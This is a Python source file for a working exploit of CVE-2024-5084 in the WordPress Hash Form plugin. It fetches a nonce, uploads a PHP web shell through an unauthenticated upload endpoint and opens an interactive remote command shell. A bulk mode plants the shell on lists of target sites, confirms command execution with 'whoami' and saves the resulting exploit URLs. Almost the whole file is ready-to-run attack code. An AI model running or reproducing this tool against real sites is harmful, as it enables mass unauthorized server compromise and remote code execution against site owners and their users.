import re
import sys
import json
import requests
import rich_click as click

from typing import Optional, List, Tuple
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from requests.exceptions import RequestException
from prompt_toolkit.history import InMemoryHistory

requests.packages.urllib3.disable_warnings()


class HashForms:
    """
    A class to interact with a WordPress site using the Hash Form plugin, demonstrating
    exploitation of CVE-2024-5084: Unauthenticated Arbitrary File Upload leading to Remote Code Execution.
    """

    def __init__(self, base_url: str):
        """
        Initializes the HashForms instance with the base URL of the WordPress site.
        """
        self.base_url = self.normalize_url(base_url)

    def normalize_url(self, url: str) -> str:
        """
        Normalizes URL to ensure it has proper http/https protocol.
        """
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            # Try https first, then http if needed
            return f"https://{url}"
        return url

    def get_nonce(self) -> Optional[str]:
        """
        Retrieves the nonce required for file upload from the WordPress site.
        """
        try:
            response = requests.get(self.base_url, verify=False, timeout=10)
            response.raise_for_status()
            return re.search(r'"ajax_nounce":"(\w+)"', response.text).group(1)
        except RequestException as e:
            self.custom_print(f"Connection error: {e}", "-")
        except AttributeError:
            self.custom_print("Nonce not found in the response.", "-")
        return None

    def upload_php_file(
        self, nonce: str, file_content: str, file_name: str = "pwny.php"
    ) -> Optional[str]:
        """
        Attempts to upload a PHP file using the obtained nonce.
        """
        full_url = f"{self.base_url}/wp-admin/admin-ajax.php"
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; rv:124.0)",
            "Content-Length": str(len(file_content)),
        }
        params = {
            "action": "hashform_file_upload_action",
            "file_uploader_nonce": nonce,
            "allowedExtensions[0]": "php",
            "sizeLimit": 1048576,
            "qqfile": file_name,
        }

        try:
            response = requests.post(
                full_url,
                headers=headers,
                params=params,
                data=file_content,
                verify=False,
                timeout=15
            )
            response.raise_for_status()
            response_json = response.json()
            if response_json.get("success"):
                self.custom_print(
                    f"File uploaded successfully; system vulnerable to CVE-2024-5084.",
                    "+",
                )
                return response_json["url"]
            self.custom_print("Upload failed; server did not return success.", "-")
        except RequestException as e:
            self.custom_print(f"Upload failed: {e}", "-")
        return None

    def interactive_shell(self, url: str):
        """
        Launches an interactive shell to communicate with the uploaded PHP file for command execution.
        """
        session = PromptSession(history=InMemoryHistory())
        while True:
            cmd = session.prompt(
                HTML("<ansiyellow><b>$ </b></ansiyellow>"), default=""
            ).strip()
            if cmd.lower() == "exit":
                break
            if cmd.lower() == "clear":
                sys.stdout.write("\x1b[2J\x1b[H")
                continue

            response = self.fetch_response(url, cmd)
            if response:
                self.custom_print(f"Result:\n\n{response}", "*")
            else:
                self.custom_print("Failed to receive response from the server.", "-")

    def fetch_response(self, url: str, cmd: str) -> Optional[str]:
        """
        Sends a command to the remote PHP file and fetches the output.
        """
        try:
            response = requests.get(f"{url}?cmd={cmd}", verify=False, timeout=10)
            response.raise_for_status()
            return response.text
        except RequestException:
            self.custom_print("Error communicating with the remote server.", "-")
        return None

    def custom_print(self, message: str, header: str) -> None:
        """
        Prints a message with a colored header to indicate the message type.
        """
        header_colors = {"+": "green", "-": "red", "!": "yellow", "*": "blue"}
        header_color = header_colors.get(header, "white")
        formatted_message = click.style(
            f"[{header}] ", fg=header_color, bold=True
        ) + click.style(f"{message}", bold=True, fg="white")
        click.echo(formatted_message)

    def test_vulnerability(self) -> Tuple[bool, Optional[str]]:
        """
        Tests if the target is vulnerable to CVE-2024-5084.
        Returns (is_vulnerable, exploit_url)
        """
        nonce = self.get_nonce()
        if nonce:
            file_url = self.upload_php_file(nonce, '<?php system($_GET["cmd"]); ?>')
            return (file_url is not None, file_url)
        return (False, None)


def read_urls_from_file(filename: str) -> List[str]:
    """
    Reads URLs from a file and returns them as a list.
    """
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
        return urls
    except FileNotFoundError:
        click.echo(click.style(f"[-] File {filename} not found!", fg="red", bold=True))
        return []
    except Exception as e:
        click.echo(click.style(f"[-] Error reading {filename}: {e}", fg="red", bold=True))
        return []


def write_vulnerable_urls(filename: str, vulnerable_data: List[Tuple[str, str]]) -> None:
    """
    Writes vulnerable URLs and their exploit URLs to a file.
    """
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("TARGET_URL | EXPLOIT_URL\n")
            f.write("-----------|------------\n")
            for target_url, exploit_url in vulnerable_data:
                f.write(f"{target_url} | {exploit_url}\n")
        click.echo(click.style(f"[+] Vulnerable URLs saved to: {filename}", fg="green", bold=True))
    except Exception as e:
        click.echo(click.style(f"[-] Error writing to {filename}: {e}", fg="red", bold=True))


def write_simple_list(filename: str, vulnerable_data: List[Tuple[str, str]]) -> None:
    """
    Writes only exploit URLs to a simple list file.
    """
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            for target_url, exploit_url in vulnerable_data:
                f.write(f"{exploit_url}\n")
        click.echo(click.style(f"[+] Exploit URLs saved to: {filename}", fg="green", bold=True))
    except Exception as e:
        click.echo(click.style(f"[-] Error writing to {filename}: {e}", fg="red", bold=True))


def process_single_target(url: str):
    """
    Process a single target URL with interactive shell.
    """
    hash_forms = HashForms(url)
    nonce = hash_forms.get_nonce()
    if nonce:
        file_url = hash_forms.upload_php_file(nonce, '<?php system($_GET["cmd"]); ?>')
        if file_url:
            hash_forms.custom_print(f"File uploaded to: {file_url}. Interactive shell available.", "+")
            hash_forms.interactive_shell(file_url)
        else:
            hash_forms.custom_print("Upload failed;", "-")
    else:
        hash_forms.custom_print("Nonce not found, unable to attempt upload.", "-")


def process_bulk_targets(input_file: str, output_file: str):
    """
    Process multiple targets from a file and save vulnerable ones to output file.
    """
    urls = read_urls_from_file(input_file)
    if not urls:
        return

    click.echo(click.style(f"[*] Processing {len(urls)} targets from {input_file}", fg="blue", bold=True))
    
    vulnerable_data = []  # List of tuples: (target_url, exploit_url)
    
    for i, url in enumerate(urls, 1):
        click.echo(click.style(f"[{i}/{len(urls)}] Testing: {url}", fg="yellow", bold=True))
        
        hash_forms = HashForms(url)
        is_vulnerable, exploit_url = hash_forms.test_vulnerability()
        
        if is_vulnerable and exploit_url:
            click.echo(click.style(f"[+] VULNERABLE: {url}", fg="green", bold=True))
            click.echo(click.style(f"[+] Exploit URL: {exploit_url}", fg="green", bold=True))
            vulnerable_data.append((url, exploit_url))
            
            # Opsional: Test command execution untuk verifikasi
            click.echo(click.style("[*] Testing command execution...", fg="blue", bold=True))
            test_response = hash_forms.fetch_response(exploit_url, "whoami")
            if test_response:
                click.echo(click.style(f"[+] Command execution verified: {test_response.strip()}", fg="green", bold=True))
            else:
                click.echo(click.style("[-] Command execution failed", fg="red", bold=True))
        else:
            click.echo(click.style(f"[-] NOT VULNERABLE: {url}", fg="red", bold=True))
    
    if vulnerable_data:
        # Save detailed report
        write_vulnerable_urls(output_file, vulnerable_data)
        
        # Save simple exploit URLs list
        exploit_list_file = output_file.replace('.txt', '_exploits.txt')
        write_simple_list(exploit_list_file, vulnerable_data)
        
        click.echo(click.style(f"[+] Found {len(vulnerable_data)} vulnerable targets!", fg="green", bold=True))
        click.echo(click.style(f"[+] Detailed report: {output_file}", fg="green", bold=True))
        click.echo(click.style(f"[+] Exploit URLs only: {exploit_list_file}", fg="green", bold=True))
        
        # Show summary
        click.echo(click.style("\n[+] VULNERABLE TARGETS SUMMARY:", fg="green", bold=True))
        for target_url, exploit_url in vulnerable_data:
            click.echo(click.style(f"  Target: {target_url}", fg="white"))
            click.echo(click.style(f"  Exploit: {exploit_url}", fg="cyan"))
            click.echo("")
    else:
        click.echo(click.style("[-] No vulnerable targets found.", fg="red", bold=True))


if __name__ == "__main__":

    @click.command()
    @click.option(
        "-u", "--url", type=str, required=False, help="Single target URL"
    )
    @click.option(
        "-l", "--list", "input_file", type=str, required=False, help="File containing list of URLs"
    )
    @click.option(
        "-o", "--output", "output_file", type=str, required=False, help="Output file for vulnerable URLs"
    )
    @click.option(
        "--only-exploits", is_flag=True, help="Save only exploit URLs (without target URLs)"
    )
    def main(url: str, input_file: str, output_file: str, only_exploits: bool):
        """
        CVE-2024-5084 - Hash Forms WordPress Plugin Vulnerability Scanner
        """
        if url and input_file:
            click.echo(click.style("[-] Please use either -u for single target or -l for bulk scan, not both.", fg="red", bold=True))
            return
        
        if not url and not input_file:
            click.echo(click.style("[-] Please specify either -u for single target or -l for bulk scan.", fg="red", bold=True))
            return
        
        if input_file and not output_file:
            click.echo(click.style("[-] Please specify -o output file when using -l list file.", fg="red", bold=True))
            return
        
        if url:
            # Single target mode with interactive shell
            process_single_target(url)
        elif input_file and output_file:
            # Bulk scan mode
            process_bulk_targets(input_file, output_file)

    main()
